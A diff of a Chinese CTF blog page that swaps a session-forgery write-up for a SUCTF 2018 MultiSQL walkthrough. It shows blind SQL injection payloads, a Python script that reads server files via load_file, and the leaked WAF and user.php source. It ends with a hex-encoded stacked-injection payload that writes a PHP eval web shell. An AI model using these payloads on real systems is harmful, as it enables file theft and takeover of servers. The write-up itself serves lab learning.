@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>[RootersCTF2019]ImgXweb(session伪造) | 过客</title>	
+<title>[SUCTF 2018]MultiSQL(sql读取文件+写入文件) | 过客</title>	
 
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 <script type="text/javascript">
@@ -150,10 +150,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">[RootersCTF2019]ImgXweb(session伪造)</h1>
+			<h1 class="wow swing entry-title">[SUCTF 2018]MultiSQL(sql读取文件+写入文件)</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-12 08:36:26" itemprop="datePublished" pubdate="">2020-03-12</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-12 20:07:02" itemprop="datePublished" pubdate="">2020-03-12</time></i>
 	          </div>
 			
 </span>
@@ -161,17 +161,67 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>有注册。登陆。文件上传功能<br>
-首先登陆处判断注入。并不存在<br>
-登陆上后。文件上传。不能传.htaccess类似的。但是php啥的都可以传。but不解析<br>
-那么应该不是phpweb。java。也不像。估计是python。<br>
-扫描下目录。发现robots.txt<br>
-<img src="https://guokeya.github.io/post-images/1583974068028.png" alt="" loading="lazy"><br>
-仿佛是密钥。<br>
-<img src="https://guokeya.github.io/post-images/1583974091048.png" alt="" loading="lazy"><br>
-修改用户为admin<br>
-发现flag.png。读取得到flag<br>
-<img src="https://guokeya.github.io/post-images/1583974148674.png" alt="" loading="lazy"></p>
+				<p>首先。还是扫目录。。了解下大概的功能<br>
+注册登陆后。有两个功能。<br>
+一个是用户信息。输入2-1。返回的是id为1的信息。存在数字型注入<br>
+一个是上文头像。然而绕不过去。。<br>
+先对用户信息fuzz下。看过滤了啥<br>
+<img src="https://guokeya.github.io/post-images/1584015326202.png" alt="" loading="lazy"><br>
+加上单引号就空白。估计是ban了。这就很难受。不能有单引号。输入sql语句。如果报错也是空白。正则。也是空白。</p>
+<pre><code>0^(substr(1,1,1))
+#空白。可能逗号或substr被过滤
+0^hex(1)
+#hex没被过滤
+0^(length(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&gt;1)
+#读取/var/www/html/index.php。发现可以读取
+</code></pre>
+<p>在做CTFSHOW的时候。只要是sql题有注入。都可以直接load_file盲注flag。。。<br>
+这里尝试读下文件</p>
+<pre><code>import requests
+cookies = {
+    &quot;PHPSESSID&quot;:&quot;fg4kp97ksielnvnssv53iul2s6&quot;
+}
+data='0x'
+flag=''
+r=requests.session()
+for i in range(9999):
+    for i in range(1,127):
+        #print (i)
+        url='http://e70a6fd4-f987-4651-9aa1-4bfd134e9a59.node3.buuoj.cn/user/user.php?id=0^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870))&lt;'+data+str(hex(i)).replace('0x','')+')'
+        result=r.get(url=url,cookies=cookies).text
+        if 'admin' in result:
+            data+=str(hex(i-1)).replace('0x','')
+            flag+=(chr(i-1))
+            print (flag)
+            break
+print(data)
+</code></pre>
+<p>脚本运行时会有点问题。重新运行就好了。不知道为啥。估计429吧。<br>
+读取index.php。发现包含了bwvs_config/config.php和waf.php<br>
+读取下waf.php。得到</p>
+<pre><code>function waf($str){
+		$black_str = &quot;/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i&quot;;
+		$str = preg_replace($black_str, &quot;@@&quot;,$str);
+		return addslashes($str);
+	}
+	
+</code></pre>
+<p>继续读user.php(存在注入的文件)</p>
+<pre><code>if(isset($_GET['id'])){
+		$id=waf($_GET['id']);
+		$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_id =&quot;.$id;
+		$data = mysqli_multi_query($connect,$sql) or die();
+		
+		$result = mysqli_store_result($connect);
+		$row = mysqli_fetch_row($result);
+		echo '&lt;h1&gt;user_id:'.$row[0].&quot;&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:&quot;.$row[1].&quot;&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;注册时间：&quot;.$row[4].&quot;&lt;/h3&gt;&quot;;
+</code></pre>
+<p>mysqli_store_result这个函数。会存在堆叠注入。会过去看看正则。没过滤set。prepare。execute。可以用hex编码sql语句。然后堆叠注入<br>
+之前还有一个用户头像上传的地址。有写权限。那就可以利用堆叠注入。直接写shell。</p>
+<pre><code>set @xx=0x53454c45435420273c3f70687020406576616c28245f504f53545b615d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e70687027;prepare x from @xx;execute x;
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1584017115014.png" alt="" loading="lazy"><br>
+写入一句话getshell</p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
@@ -185,10 +235,8 @@ window.onload=getCSS();
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/t4QExMZtn/" rel="prev"> [SUCTF 2018]MultiSQL(sql读取文件+写入文件)</a></div>
 		 
-		 
-		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/YxXnoaHlI/" rel="next"> [RootersCTF2019]I_&lt;3_Flask(fuzz)</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/U00Vbfnjz/" rel="next"> [RootersCTF2019]ImgXweb(session伪造)</a></div>
 		
 		</div>
 	</nav>
